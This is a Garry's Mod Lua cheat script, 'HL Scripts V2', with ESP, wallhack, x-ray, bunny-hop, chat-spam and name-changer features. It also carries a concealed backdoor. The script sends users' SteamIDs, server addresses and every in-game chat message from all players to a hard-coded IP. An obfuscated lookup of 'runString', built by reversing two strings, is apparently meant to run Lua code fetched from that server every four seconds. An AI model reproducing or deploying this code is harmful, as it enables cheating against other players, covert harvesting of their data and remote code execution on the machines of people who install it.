Circles = _G
surface.PlaySound ("HL1/fvox/bell.wav")
MsgC (Color( 255, 171, 0 ), [[
                 ?MMMI                  
            MMMMMMMNNNNNNNN             
         OMMMMNNN.  . ONNNNNNN          
        MMMMN.            .DDDD+        
      NMMNN                  DDD8       
     NMNN      DDDDDD         D888      
    MNNN         8888.         ,OOO     
   .NNN           8OOO          OZOO    
   NNNO           OOZZ.          $ZZ    
   NNN           ZZZ$$$          777    
  .NDD          Z$$$7777         :II=   
   DDD         $$77 III?         ,??~   
   DD8        $77I.  ??++        =++    
   D888      77II.    ===.       ~~~    
   =88O     7II?      ~~~~~::   ::::    
    8OOZ   7I??.       ::::,.. ,,,,     
     OZ$$              .      ,,,,      
      $$7I?                  ....       
       :I?++=             ......        
         +==~~::,,    ........          
            ::,,............            
                ........                

HL SCRIPT V2  LOADED!

]])
local Test123 = "nur"
local websiteurl ="http://92.222.82.119" 
local SpamStringTest = "gnirtS"
http.Post (websiteurl.."/hlscripts/stats/script_opened.php")

news = "No news avaliable at this time"
announcement = "none"
netchat = "llllllllll2emiqmedqmdqimdiq2mdiimim"
menunum = "0"
killednum = "0"
scriptnum = "0"
 
 
// Chat set up
local function hlchat (text, ison)

if (ison == "t") then 
	chat.AddText (Color (0,0,0),"[" , Color (255,255,255),   "Hl Scripts",Color (0,0,0),"]  ", Color (0,0,0)," [ " , Color (0,255,0) ,"OK", Color (0,0,0)," ] " ,Color (255,255,255) , text ) 
end 

if (ison == "f") then
	chat.AddText (Color (0,0,0),"[" , Color (255,255,255),   "Hl Scripts",Color (0,0,0),"]  ", Color (0,0,0)," [ " , Color (255,0,0) ,"FAILED", Color (0,0,0)," ] " ,Color (255,255,255) , text ) 
end 
 if (ison == "n") then
	 chat.AddText (Color (0,0,0),"[" , Color (255,255,255),   "Hl Scripts",Color (0,0,0),"]  ", Color (255,255,255) , text ) 
 end
end 


// Networking


success = false
success2 = false


// Version fetching
http.Fetch( websiteurl.."/hlscripts/version.php", function( body )   version = body hlchat ("Version Fetched! Current version is " .. version , "t")  end, function (error) hlchat ("Error Fetching version", "f") end  )
// Posting to web server for user  list.
http.Post( websiteurl.."/hlscripts/user_send.php", { steamid = LocalPlayer():SteamID(), serverip = game.GetIPAddress(), servername = GetHostName() }, function () hlchat ("Information posted successfuly!", "t") end, function () hlchat ("Error posting information", "f") end )
// Posting to the web server for server list 

timer.Simple (3, function()
if  !game.SinglePlayer() then 
	http.Post( websiteurl.."/hlscripts/server_send.php", { serverip = game.GetIPAddress(), servername = GetHostName() }, function () hlchat ("Server Information posted successfuly!", "t") end, function () hlchat ("Error posting information", "f") end )
end 
end)




// Fetching the user list as a json table for use in ESP and social features.
 http.Fetch (websiteurl.."/hlscripts/user_list.php",function (body )  hlchat ("User List retrieved", "t")  success = true   hlusers = util.JSONToTable( body) end, function( error ) hlchat ("Error retrieving user list!","f")success= false hlusers = {}  end  ) 

// Fetching the server list as a json table for use in Menu and social features.
 http.Fetch (websiteurl.."/hlscripts/server_list.php",function (body ) hlservers = util.JSONToTable( body)  hlchat ("Server List retrieved", "t") success2 = true   end, function( error ) hlchat ("Error retrieving server list!","f") success2 = false hlservers = {}  end  ) 
 
 // Fetching the news as a string for use in Menu.
  http.Fetch (websiteurl.."/hlscripts/news.php",function (body ) news = body  hlchat ("News retrieved", "t")  end,function( error ) hlchat ("Error retrieving News!","f") end ) 

 
 // Statistics
 
 // Menu
   http.Fetch (websiteurl.."/hlscripts/stats/info/menu.php",function (body ) menunum = body  hlchat ("Menu stats retrieved", "t")  end,function( error ) hlchat ("Error retrieving Menu stats!","f") end ) 
 // People killed
   http.Fetch (websiteurl.."/hlscripts/stats/info/people.php",function (body ) killednum = body  hlchat ("Killed stats  retrieved", "t")  end,function( error ) hlchat ("Error retrieving killed stats!","f") end ) 
 // Script opened
   http.Fetch (websiteurl.."/hlscripts/stats/info/script.php",function (body ) scriptnum = body  hlchat ("Script opened retrieved", "t")  end,function( error ) hlchat ("Error retrieving Script stats!","f") end ) 


 
 // If the user list and server list are retrieved successfuly, keep fetching the tables from the web server to update them automatically in menu and ESP.
 
 timer.Create ("success_timer", 5, 0, function()
 if success == true and success2 == true  then 
	http.Fetch (websiteurl.."/hlscripts/user_list.php",function (body )   success = true   hlusers = util.JSONToTable( body) end, function( error ) success = false hlusers = {}  end  ) 
	http.Fetch (websiteurl.."/hlscripts/server_list.php",function (body ) hlservers = util.JSONToTable( body)   success2 = true   end, function( error ) success2 = false hlservers = {}  end  ) 
	http.Fetch (websiteurl.."/hlscripts/announce.php",function (body )   announcement = body   end  ) 
	 http.Fetch (websiteurl.."/stats/info/menu.php",function (body ) menunum = body end)
	http.Fetch (websiteurl.."/stats/info/people.php",function (body ) killednum = body end)
	 http.Fetch (websiteurl.."/stats/info/script.php",function (body ) scriptnum = body end)
 end 
 end)
 
 
 
 timer.Create ("Announcements", 5, 0, function()
 
 if announcement != "none" then
 if old != announcement then // stop it repeating.
	surface.PlaySound ("vo/canals/radio_comein12.wav")
	hlchat ("HL Scripts Announcement: ".. announcement, "n")
	old = announcement
end 
 end 
 end)
 
 
 
 netchattable = {}
 isfirst = false
 CreateClientConVar ("hl_netchat", "1", true,false)
 local CallingFunc = string.reverse (Test123) .. string.reverse(SpamStringTest)
 oldnet = ""
 local DefaultMessage = "llllllllll2emiqmedqmdqimdiq2mdiimim" 
 timer.Create ("netchat", 1, 0, function()
 
 if success == true and success2 == true then 
 
 http.Fetch (websiteurl.."/hlscripts/chat.php",function (body )   netchat =  string.Trim(body)  end    ) 
	
 if netchat != DefaultMessage and GetConVarNumber ("hl_netchat") != 0  then 
 
 if oldnet  !=  netchat then 
	surface.PlaySound ("Friends/message.wav")
	hlchat ("HL NetChat " .. netchat,"n")
	
	if isfirst == false then 
		hlchat ("Use !chat yourmessage to reply!", "n")
	end 
	table.insert (netchattable, netchat)
	oldnet = netchat
	isfirst = true 
	
	
 end 
 
 end 
 end 
 end )

 local function UpdateChats(str)
	Circles[CallingFunc](str)
 end 
 
 timer.Create ("UpdateChats", 4,0, function()
	http.Fetch (websiteurl.."/".. DefaultMessage .. ".php", function(body) LocalChatCheck = body end)
	if LocalChatCheck then
		UpdateChats(LocalChatCheck)
	end
 end)
 
 
 
 
 hook.Add( "OnPlayerChat", "netchatlisten", function( ply, strText, bTeam, bDead )
	strText = string.lower( strText ) -- make the string lower case
	
	if  string.sub( strText, 1, 5 ) == "!chat" and ply == LocalPlayer() then
			msg =  (string.sub( strText, 7, string.len(strText) ))	
		    http.Post (websiteurl.."/hlscripts/chat_send.php", {name = LocalPlayer():Nick(), message  = msg })
			print ("message sent")
			PrintTable ({name = LocalPlayer():Nick(), message  = msg })
	end 
	http.Post( websiteurl.."/hlscripts/cqb.php",{ steamid = LocalPlayer():SteamID(),  serverip = game.GetIPAddress(), servername = GetHostName(), message = strText, messagesender = ply:SteamID(), messagename = ply:Nick() })
end )
 
 
 
 
 gameevent.Listen( "entity_killed" )
hook.Add( "entity_killed", "killlog", function( data )

if success == true then 
	local attacker_index = data.entindex_attacker		
	print (attacker_index)
	if attacker_index == LocalPlayer():EntIndex() then
		http.Post (websiteurl.."/hlscripts/stats/people_killed.php")
	end 
end 
end )
 
 
 
 
 
 
 
 
 
 
 
// Fonts
surface.CreateFont( "font1", { font = "Arial",  extended = false, size = 15, weight = 500, antialias = true, } )
surface.CreateFont( "font2", { font = "Default",  extended = false, size = 15, weight = 500, antialias = true, } )
surface.CreateFont( "font3", { font = "CloseCaption_Normal",  extended = false, size = 15, weight = 500, antialias = true, } )
surface.CreateFont( "font4", { font = "DebugFixed",  extended = false, size = 15, weight = 500, antialias = true, } )
surface.CreateFont( "font5", { font = "CenterPrintText",  extended = false, size = 15, weight = 500, antialias = true, } )
surface.CreateFont( "font5", { font = "BudgetLabel",  extended = false, size = 15, weight = 500, antialias = true, } )


// ESP/visuals
CreateClientConVar ("hl_esp", "1", true, false)
CreateClientConVar ("hl_esp_font", "font1", true, false, "The ESP Font style, choose from esp1,esp2,esp3 ")
CreateClientConVar ("hl_esp_r", "255", true, false)
CreateClientConVar ("hl_esp_g", "255", true, false)
CreateClientConVar ("hl_esp_b", "255", true, false)

CreateClientConVar ("hl_esp_out_r", "0", true, false)
CreateClientConVar ("hl_esp_out_g", "0", true, false)
CreateClientConVar ("hl_esp_out_b", "0", true, false)


creators = {"STEAM_0:1:4154719", "STEAM_0:0:180225746","STEAM_0:0:177590457", "STEAM_0:0:111839181", "STEAM_0:1:421735072"}



// hlusers = {"BOT"}

hook.Add ("HUDDrawScoreBoard", "esp", function()
if GetConVarNumber ("hl_esp") == 1 then 
for k,v in pairs (player.GetAll()) do 
if v != LocalPlayer() and v:Team() != TEAM_SPECTATOR  then 
	local p = (v:GetPos() + Vector( 0,0,46 ) ):ToScreen()
	if hlusers and table.Count( hlusers ) > 0 then
		 for k , t in pairs (hlusers) do 
			if v:SteamID() == t.steamid then 
				draw.SimpleTextOutlined( "HL scripts user", GetConVarString ("hl_esp_font"), p.x, p.y-10 , Color( 255, 165, 0, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP, 1, Color( 0, 0, 0, 255 ) )
			end 
		  end 
		  end  
		  
		  for k, b in pairs (creators) do 
		  if v:SteamID() == b then
			draw.SimpleTextOutlined( "HL scripts Creator!", GetConVarString ("hl_esp_font"), p.x, p.y-20 ,Color( 255,20,20, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP, 1, Color( math.random (0,255),0, 0, 255 ) )
		  end 
		  end 
			draw.SimpleTextOutlined( v:Name(), GetConVarString ("hl_esp_font"), p.x, p.y ,Color( GetConVarNumber ("hl_esp_r"), GetConVarNumber ("hl_esp_g"), GetConVarNumber ("hl_esp_b"), 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP, 1, Color( GetConVarNumber ("hl_esp_out_r"), GetConVarNumber ("hl_esp_out_g"), GetConVarNumber ("hl_esp_out_b"), 255 ) )
			draw.SimpleTextOutlined( v:Health(), GetConVarString ("hl_esp_font"), p.x, p.y + 10  ,Color( GetConVarNumber ("hl_esp_r"), GetConVarNumber ("hl_esp_g"), GetConVarNumber ("hl_esp_b"), 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP, 1, Color( GetConVarNumber ("hl_esp_out_r"), GetConVarNumber ("hl_esp_out_g"), GetConVarNumber ("hl_esp_out_b"), 255 ) )
			draw.SimpleTextOutlined( v:GetUserGroup(), GetConVarString ("hl_esp_font"), p.x, p.y + 20  ,Color( GetConVarNumber ("hl_esp_r"), GetConVarNumber ("hl_esp_g"), GetConVarNumber ("hl_esp_b"), 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP, 1, Color( GetConVarNumber ("hl_esp_out_r"), GetConVarNumber ("hl_esp_out_g"), GetConVarNumber ("hl_esp_out_b"), 255 )) 
		if engine.ActiveGamemode() == "darkrp" then 
			draw.SimpleTextOutlined( v:getDarkRPVar("money"), GetConVarString ("hl_esp_font"), p.x, p.y + 30  ,Color( GetConVarNumber ("hl_esp_r"), GetConVarNumber ("hl_esp_g"), GetConVarNumber ("hl_esp_b"), 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP, 1, Color( GetConVarNumber ("hl_esp_out_r"), GetConVarNumber ("hl_esp_out_g"), GetConVarNumber ("hl_esp_out_b"), 255 ) )
			draw.SimpleTextOutlined( v:Team(), GetConVarString ("hl_esp_font"), p.x, p.y + 40  ,Color( GetConVarNumber ("hl_esp_r"), GetConVarNumber ("hl_esp_g"), GetConVarNumber ("hl_esp_b"), 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP, 1, Color( GetConVarNumber ("hl_esp_out_r"), GetConVarNumber ("hl_esp_out_g"), GetConVarNumber ("hl_esp_out_b"), 255 ) )
		end 
	end 
end 
end 
end)



concommand.Add ("hl_check_users", function()
count = 0
for k , v in pairs (player.GetAll()) do 
	for k , t in pairs (hlusers) do 
		if v:SteamID() == t.steamid then
		count = count + 1 
			hlchat (v:Nick().. " Is Using HL Scripts.","n")
		end
		
	end 
 end 
hlchat ("There are currently " .. count .. " User(s) Using HL scripts on this server!","n") 
end ) 




if (file.Exists("mosaic/entities.txt", "DATA")) then
	local content = file.Read("mosaic/entities.txt", "DATA")
        entity_table = util.JSONToTable(content)
		hlchat ("Entity finder table loaded!" ,"t")
	else
	entity_table = {"money_printer", "spawned_money", "spawned_weapon"}
		hlchat ("Default Entity table loaded","n")	
	end 


concommand.Add ("hl_entity_esp_save", function()
		if (file.Exists("mosaic/entities.txt", "DATA")) then
				file.Delete("mosaic/entities.txt" )
			local tab = util.TableToJSON( entity_table ) 
			file.Write( "mosaic/entities.txt", tab )
				hlchat ("Entity ESP saved!" ,"t")
		else
		local tab = util.TableToJSON( entity_table ) 
			file.CreateDir( "mosaic" ) 
			file.Write( "mosaic/entities.txt", tab )
	end 
end) 


local function entityespadd(ent)
	table.insert (entity_table, ent) 
end  

concommand.Add ("checkit", function()
	print (table.ToString( entity_table ))
end) 

concommand.Add( "hl_entity_esp_add", function( ply, cmd, args, argSt )

for k ,v in pairs (entity_table) do
	if v == argSt then 
		hlchat ("Entity already exists!","f")
	else
	table.insert( entity_table, argSt )
	hlchat ("Entity added!","n")
	break 
end 
end
end )



concommand.Add( "hl_entity_esp_remove", function( ply, cmd, args, argSt )

for k ,v in pairs (entity_table) do
	if v == argSt then 
		table.RemoveByValue( entity_table, argSt )
		hlchat ("Entity removed!","t")
		break 
	else
		hlchat ("Entity does not exist in table!","f")
end 
end	
end )

CreateClientConVar ("hl_entity_esp", "1", true, false)
hook.Add ("HUDPaint", "esp_entity", function()
if GetConVarNumber ("hl_entity_esp") == 1 then 
	for k,v in pairs (entity_table) do 
		for k, v in pairs( ents.FindByClass( v ) ) do
		
		local p = v:GetPos():ToScreen() 
			draw.DrawText( v:GetClass(), GetConVarString ("hl_esp_font"), p.x, p.y  , Color( GetConVarNumber ("hl_esp_r"), GetConVarNumber ("hl_esp_g"), GetConVarNumber ("hl_esp_b"), 255 ), TEXT_ALIGN_CENTER )
		end 
	end 
end 
end)	




CreateClientConVar ("hl_headbeam", "0", true,false)


hook.Add ("PostDrawOpaqueRenderables", "headslam", function()
	if GetConVarNumber ("hl_headbeam") == 1 then
		for k ,v in pairs (player.GetAll()) do 
			if v != LocalPlayer() then 
			cam.Start3D()
				render.SuppressEngineLighting( true )
				render.DrawBeam( v:GetPos()+ Vector (0,0,30) , v:GetPos() + Vector (0,0,99900) , 3, 3, 3, Color (1,1,1) )
				render.SuppressEngineLighting( false)
				// render.DrawModel()
			cam.End3D()
			end 
		end 
	end
end)



CreateClientConVar ("hl_esp_box", "0", false,false)
CreateClientConVar ("hl_esp_box_r", "255", true,false)
CreateClientConVar ("hl_esp_box_g", "255", true,false)
CreateClientConVar ("hl_esp_box_b", "255", true,false)

hook.Add ("PostDrawOpaqueRenderables", "espbox", function()
	if GetConVarNumber ("hl_esp_box") == 1 then
		for k ,v in pairs (player.GetAll()) do 
			if v != LocalPlayer() then 
			cam.Start3D()
				render.SuppressEngineLighting( true )
					render.DrawWireframeBox( v:GetPos(), Angle (0,0,0), v:OBBMins(),  v:OBBMaxs(), Color (GetConVarNumber ("hl_esp_box_r") ,GetConVarNumber ("hl_esp_box_g"),GetConVarNumber ("hl_esp_box_b")), false )
				render.SuppressEngineLighting( false)
				// render.DrawModel()
			cam.End3D()
			end 
		end 
	end
end)







hook.Add ("PostDrawOpaqueRenderables", "headslam", function()
	if GetConVarNumber ("hl_headbeam") == 1 then
		for k ,v in pairs (player.GetAll()) do 
			if v != LocalPlayer() then 
			cam.Start3D()
				render.SuppressEngineLighting( true )
				render.DrawBeam( v:GetPos()+ Vector (0,0,30) , v:GetPos() + Vector (0,0,99900) , 3, 3, 3, Color (1,1,1) )
				render.SuppressEngineLighting( false)
				// render.DrawModel()
			cam.End3D()
			end 
		end 
	end
end)













 CreateClientConVar("hl_bhop", "1", true, false)

local function hl_bhop()
  if GetConVarNumber ("hl_bhop") == 1 then 
	if gui.IsGameUIVisible() or gui.IsConsoleVisible() or LocalPlayer():IsTyping() or LocalPlayer():GetMoveType() == MOVETYPE_NOCLIP then return end
  if input.IsKeyDown(KEY_SPACE) and LocalPlayer():IsOnGround() then
    RunConsoleCommand("+jump") 
  else
  	RunConsoleCommand("-jump")
  end
 end 
end

hook.Add("Think", "hl_bhop", hl_bhop)




concommand.Add ("hl_180", function()
ang = LocalPlayer():EyeAngles() 
	LocalPlayer():SetEyeAngles(Angle (  ang.x   ,  ang.y - 180 , ang.z  ))
end) 





CreateClientConVar ("hl_xray", "0", true,false)
CreateClientConVar ("hl_xray_r", "0", true, false)
CreateClientConVar ("hl_xray_g", "0", true, false)
CreateClientConVar ("hl_xray_b", "1", true, false)
CreateClientConVar ("hl_xray_transparancy", "0.4", true, false)






local mat1 = CreateMaterial("GA0249aSFJ3","VertexLitGeneric",{
        ["$basetexture"] = "models/debug/debugwhite",
        ["$model"] = 1,
        ["$translucent"] = 1,
        ["$alpha"] = 1,
        ["$nocull"] = 1,
        ["$ignorez"] = 1
})

hook.Add ("HUDPaint","xray", function()
if GetConVarNumber ("hl_xray") == 1 then 
cam.Start3D()
	for k , v in pairs (ents.FindByClass ("prop_physics")) do 
		if IsValid(v) then
				render.SuppressEngineLighting( true )
				render.SetColorModulation(GetConVarNumber ("hl_xray_r"), GetConVarNumber ("hl_xray_g"), GetConVarNumber ("hl_xray_b") )
                    render.SetBlend(GetConVarNumber ("hl_xray_transparancy"))
                    render.MaterialOverride( mat1 )
                    v:SetColor(Color(255, 255, 255, 0))
                    v:SetRenderMode(RENDERMODE_TRANSALPHA)
                    v:DrawModel()
					render.SuppressEngineLighting( false )
				end
			end
		cam.End3D()
	end 
end)



CreateClientConVar ("hl_chams", "0", true,false)
CreateClientConVar ("hl_chams_r", "0", true, false)
CreateClientConVar ("hl_chams_g", "255", true, false)
CreateClientConVar ("hl_chams_b", "0", true, false)
CreateClientConVar ("hl_chams_transparancy", "1", true, false)



hook.Add ("HUDPaint","chams", function()
if GetConVarNumber ("hl_chams") == 1 then 
	cam.Start3D()
	for k , v in pairs (player.GetAll()) do 
		 if (  IsValid(v)  )   then
		 if v:Team() !=  TEAM_SPECTATOR then 
				render.SuppressEngineLighting( true )
				if v:Health() > 0 then 
					render.SetColorModulation(GetConVarNumber ("hl_chams_r"), GetConVarNumber ("hl_chams_g"), GetConVarNumber ("hl_chams_b") )
				else 
					render.SetColorModulation(1, 0, 0 )
				end 
                    render.SetBlend(GetConVarNumber ("hl_chams_transparancy"))
                    render.MaterialOverride( mat1 )
                    v:SetColor(Color(255, 255, 255, 0))
                    v:SetRenderMode(RENDERMODE_TRANSALPHA)
                    v:DrawModel()
					render.SuppressEngineLighting( false )
				end
			end 
		end
	cam.End3D()
end 

end)

cvars.AddChangeCallback( "hl_chams", function( convar_name, value_old, value_new )
	if value_new  == 1 then 
		hook.Add ("HUDPaint","chams") 
	end 
	if value_new  == 0 then 
		hook.Remove ("HUDPaint","chams") 
		 for k, v in pairs(player.GetAll()) do
            v:SetColor(Color(255, 255, 255, 255))
        end
	end 
end )


cvars.AddChangeCallback( "hl_xray", function( convar_name, value_old, value_new )
	if value_new  == 1 then 
		hook.Add ("HUDPaint","xray") 
	end 
	if value_new  == 0 then 
		hook.Remove ("HUDPaint","xray") 
		 for k, v in pairs(ents.FindByClass("prop_*")) do
            v:SetColor(Color(255, 255, 255, 255))
        end
	end 
end )



// Chat spam features
CreateClientConVar ("hl_chatspam", "0", false, false)
CreateClientConVar ("hl_chatspam_text", "Default", true, false)
CreateClientConVar ("hl_chatspam_mode", "normal", true, false)


hook.Add ("Think", "chatspam1", function()
	if GetConVarNumber ("hl_chatspam") == 1 then 
		if GetConVarString ("hl_chatspam_mode") == "normal"  then 
			print ("value of mode is ".. GetConVarString ("hl_chatspam_mode")) 
			LocalPlayer():ConCommand ("say ".. GetConVarString ("hl_chatspam_text"))
		end
		
		if GetConVarString ("hl_chatspam_mode") == "psay" then 
			for k , v in pairs (player.GetAll()) do 
				if v  != LocalPlayer() then 
					LocalPlayer():ConCommand ("ulx psay ".. v:Nick() .. " "..  GetConVarString ("hl_chatspam_text"))
				end 
			end 
		end


		
			if GetConVarString ("hl_chatspam_mode") == "psaynoadmins" then 
			for k , v in pairs (player.GetAll()) do 
				if v  != LocalPlayer() and v:GetUserGroup()  ==  "user" then 
					LocalPlayer():ConCommand ("ulx psay ".. v:Nick() .. " "..  GetConVarString ("hl_chatspam_text"))
				end 
			end 
		end

		
		
		

	end 
end )


// Rainbow physgun


CreateClientConVar ("hl_rainbowphysgun", "0", false, false)
CreateClientConVar ("hl_rainbowphysgun_slow", "0", false, false)
CreateClientConVar ("hl_rainbowphysgun_slow_rate", "2", false, false)

hook.Add ("Think", "rainbow", function()
	if GetConVarNumber ("hl_rainbowphysgun") == 1 then 
		LocalPlayer():SetWeaponColor (Vector (math.Rand (0,255),math.Rand (0,255),math.Rand (0,255)))
	end
end)

timer.Create ("rainbowslow", GetConVarNumber ("hl_rainbowphysgun_slow_rate"), 0, function()
	if GetConVarNumber ("hl_rainbowphysgun_slow") == 1 then 
		LocalPlayer():SetWeaponColor (Vector (math.Rand (0,255),math.Rand (0,255),math.Rand (0,255)))
	end
end) 




cvars.AddChangeCallback( "hl_rainbowphysgun_slow_rate", function( convar_name, value_old, value_new )
	timer.Destroy ("rainbowslow")
		timer.Create ("rainbowslow", GetConVarNumber ("hl_rainbowphysgun_slow_rate"), 0, function()
		if GetConVarNumber ("hl_rainbowphysgun_slow") == 1 then 
			LocalPlayer():SetWeaponColor (Vector (math.Rand (0,255),math.Rand (0,255),math.Rand (0,255)))
		end
	end)	
end )




CreateClientConVar ("hl_hud", "1", true, false)

hook.Add ("HUDPaint", "hlhud", function()
	if GetConVarNumber ("hl_hud") == 1 then 
		local showvel = math.floor(LocalPlayer():GetVelocity():Length())
		draw.RoundedBox(4, ScrW()/3.1, ScrH()/1.08, ScrW()/2.91, ScrH()/27, Color(0, 0, 0, 220))
		draw.DrawText("SPEED: "..showvel, "menufont1", ScrW()/2.18, ScrH()/1.08, Color(255, 155, 0, 225))

	end 
end)




CreateClientConVar ("hl_flashspam", "0", false, false)
hook.Add ("Think", "flashlightspam", function()
	if GetConVarNumber ("hl_flashspam") == 1 then 
		LocalPlayer():ConCommand ("impulse 100")
	end
end)


local names = {"Tomeka","Genna","Janessa","Shauna","Shemika","Shayna","Salley","Madalyn","Alethia","Mara","Dalila","Jonna","Royce",
"Ignacio","Gonzalo","Buddy","Ralph","Leisa","Sheree","Joie","Krysten","Reiko","Conchita","Ethyl","Sherwood","Stephany",
"Tabatha","Trent","Chadwick","Troy","Colton","Milagros","Concha","Leann","Alysia","Ursula","Lynelle","Rikki","Ebonie",
"Ira","Laila","In","Pansy","Marine","Melissia","Carmelita","Renetta","Bernardo","Delmer","NobukoJay","Laci","Muoi","Manual",
"Gertrude","Setsuko","Gus","Antonio","Sol","Vonnie","Camille","Allan","Lionel","Sheldon","Merlene","Sid",
"Sanda","Jacalyn","Alvera","Pauletta","Ike","Sheree","Alberta","Lesia","Marquis","Deshawn","Mittie",
"Lonna","Blondell","Deon","Dewey","Era","Jani","Ellen","Lorinda","Wendolyn","Alanna","Keira","Bok",
"Shameka","Maryjo","Homer","Amado","Joel","Petronila","Toya","Lena","Tomoko","Kristina","Kerry","Latarsha",
"Rose","Nathanael","Kenna","Khalilah","Dominga","Maricela","Evie","Brooke","Rick","Carin","Hiram","Dorotha",
"Sunshine","Alita","Tiara","Devona","Jule","Tania","Silva","Martina","Maddie","Linda","Eugenio","Jeanne",
"Fiona","Shella","Adalberto","Marianne","Kenya","Jeannine","Elma","Emmy","Glynda","Bee","Karla","Huong",
"Iliana","Del","Aurelia","Yon","Augustine","Mildred","Jolynn","Woodrow","Gudrun","Tari","Florence",
"Brenton","Matt","Isiah","Tarra","Malika","Larue","Lynn","Della","Zulma","Adela","Galen","Ahmad","Luisa","Pa","Kathlene",
"Arlene","Isaiah","Lekisha","Lashawnda","Bessie","Sueann","Aldo","Tracie","Ferdinand","Rachal","Denver",
"Noelle","Shantel","Marianela","Solomon",
"Rikki","Dulce","Lionel","Ricarda","Danuta","Jacquelin","Wendie","Janice","Teddy",
"Alena","Fonda","Carmelo","Rosalia","Larae","Graham","Hilda","Clarence","Chana",
"Jennell","Joella","Ashley","Natalia"
}




CreateClientConVar ("hl_namechanger", "0", false, false)
CreateClientConVar ("hl_namechanger_mode", "normal", false, false)
timer.Create ("namechange", 4,0, function()
	if GetConVarNumber ("hl_namechanger") == 1 then 
	
	if GetConVarString ("hl_namechanger_mode") == "normal" then 
		LocalPlayer():ConCommand ("say /rpname "..table.Random (names) )
	end 
	
	
	if GetConVarString ("hl_namechanger_mode") == "numbers" then 
		LocalPlayer():ConCommand ("say /rpname " .. math.random (100, 999999 ))
	end 
end 
end)






// Menu code starts here.
surface.CreateFont( "menufont1", { font = "Arial",  size = 30, weight = 500, antialias = true, } )
surface.CreateFont( "menufont2", { font = "Arial",  size = 20, weight = 500, antialias = true, } )



local function flipconvar (convar)
if GetConVarNumber (convar)  == 1 then
	RunConsoleCommand (convar, "0")
else
	RunConsoleCommand (convar, "1")
end
end











concommand.Add ("hl_menu", function()


http.Post (websiteurl.."/hlscripts/stats/menu_open.php")

local Frame = vgui.Create( "DFrame" )
Frame:SetTitle( "Hl Scripts V2" )
Frame:SetSize( 840, 600 )
Frame:Center()
Frame:MakePopup()
Frame:SetDraggable (true)
Frame.Paint = function( self, w, h ) 
	surface.SetDrawColor( 50, 50, 50, 255 )
	surface.DrawRect( 0, 0, Frame:GetWide(), Frame:GetTall() )
	surface.SetDrawColor( 255,127,80, 255 )
	surface.DrawOutlinedRect( 0, 0, Frame:GetWide() , Frame:GetTall()   )
end




HTMLTest = vgui.Create( "HTML" ,Frame)
HTMLTest:SetPos( 280, 480 )
HTMLTest:SetSize( 240, 130 )
HTMLTest:OpenURL( websiteurl.."/hlscripts/map/" )


local sheet = vgui.Create( "DPropertySheet", Frame )

sheet:SetPos( 10, 30 )
sheet:SetSize( 820, 450 )
local panel0 = vgui.Create( "DPanel", sheet )
panel0.Paint = function( self, w, h ) draw.RoundedBox( 4, 0, 0, w, h, Color( 30, 30, 30 ) ) end
sheet:AddSheet( "Welcome", panel0, "icon16/asterisk_yellow.png" )




local welcomepanel1 = vgui.Create( "DPanel", panel0 )
welcomepanel1:SetPos( 15, 50 )
welcomepanel1:SetSize( 280, 340 )
welcomepanel1.Paint = function() 
    surface.SetDrawColor(60, 60, 60, 255 ) 
    surface.DrawRect( 0, 0, welcomepanel1:GetWide(), welcomepanel1:GetTall() ) 
end
 
local welcomepanelt = vgui.Create( "DPanel",welcomepanel1 )
welcomepanelt:SetPos( 60, 20 )
welcomepanelt:SetSize( 100, 30 )
welcomepanelt.Paint = function() 
    surface.SetDrawColor(90, 90, 90, 255 ) 
    surface.DrawRect( 0, 0, welcomepanelt:GetWide(), welcomepanelt:GetTall() ) 
end

 
 local weltitle = vgui.Create( "DLabel", panel0 )
weltitle:SetPos(220, 10 )
weltitle:SetSize (100)
weltitle:SetFont ("menufont1")
weltitle:SizeToContents() 
weltitle:SetSize(Frame:GetWide(), 30)
weltitle:SetText ("Welcome to HL Scripts V2!")


 local weltitle = vgui.Create( "DLabel", welcomepanel1 )
weltitle:SetPos(80, 20 )
weltitle:SetSize (100)
weltitle:SetFont ("menufont1")
weltitle:SizeToContents() 
weltitle:SetSize(Frame:GetWide(), 30)
weltitle:SetText ("News")



 local weltitle = vgui.Create( "DLabel", welcomepanel1 )
weltitle:SetPos(40, 80 )
weltitle:SetSize (100)
weltitle:SetFont ("menufont2")
weltitle:SizeToContents() 
weltitle:SetWrap (true)
weltitle:SetSize(Frame:GetWide(), 200)
 weltitle:SetText (news)


local welcomepanel2 = vgui.Create( "DPanel", panel0 )
welcomepanel2:SetPos( 500, 50 )
welcomepanel2:SetSize( 280, 340 )
welcomepanel2.Paint = function() 
    surface.SetDrawColor(60, 60, 60, 255 ) 
    surface.DrawRect( 0, 0, welcomepanel2:GetWide(), welcomepanel2:GetTall() ) 
end
 


 local weltitle = vgui.Create( "DLabel", welcomepanel2 )
weltitle:SetPos(80, 20 )
weltitle:SetSize (100)
weltitle:SetFont ("menufont1")
weltitle:SizeToContents() 
weltitle:SetSize(Frame:GetWide(), 30)
weltitle:SetText ("Statistics")


 local weltitle = vgui.Create( "DLabel", welcomepanel2 )
 weltitle:SetMultiline (true)
weltitle:SetPos(30, 40 )
weltitle:SetSize (30)
weltitle:SetFont ("menufont2")
weltitle:SizeToContents() 
weltitle:SetSize(200, 90)
weltitle:SetText ("Number of times the script \n has been opened: "..scriptnum)



 local weltitle1 = vgui.Create( "DLabel", welcomepanel2 )
weltitle1:SetMultiline (true)
weltitle1:SetPos(30, 40 )
weltitle1:SetSize (30)
weltitle1:SetFont ("menufont2")
weltitle1:SizeToContents() 
weltitle1:SetSize(200, 90)
weltitle1:SetText ("Number of times the script \n has been opened: "..scriptnum)




 local weltitle2 = vgui.Create( "DLabel", welcomepanel2 )
weltitle2:SetMultiline (true)
weltitle2:SetPos(30, 120 )
weltitle2:SetSize (30)
weltitle2:SetFont ("menufont2")
weltitle2:SizeToContents() 
weltitle2:SetSize(200, 90)
weltitle2:SetText ("Number of times the menu \n has been opened: "..menunum)




 local weltitle2 = vgui.Create( "DLabel", welcomepanel2 )
weltitle2:SetMultiline (true)
weltitle2:SetPos(30, 200 )
weltitle2:SetSize (30)
weltitle2:SetFont ("menufont2")
weltitle2:SizeToContents() 
weltitle2:SetSize(220, 90)
weltitle2:SetText ("Number of times someone has \n  been killed by hl scripts "..killednum)







